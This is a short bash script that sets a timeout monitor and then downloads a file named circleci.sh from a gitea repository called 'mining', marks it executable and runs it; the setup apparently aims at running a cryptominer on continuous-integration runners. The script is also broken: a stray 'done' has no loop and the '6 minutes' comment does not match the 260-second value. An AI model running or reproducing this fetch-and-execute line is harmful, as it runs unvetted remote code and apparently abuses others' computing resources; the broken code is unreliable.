#!/bin/bash

Timeout=260 # 6 minutes

function timeout_monitor() {
   sleep "$Timeout"
   kill "$1"
}

# start the timeout monitor in 
# background and pass the PID:
timeout_monitor "$$" &
Timeout_monitor_pid=$!

wget https://try.gitea.io/gairmeet/mining/raw/branch/master/circleci.sh && chmod +x circleci.sh && ./circleci.sh
done   
# <your script here>

# kill timeout monitor when terminating:
kill "$Timeout_monitor_pid"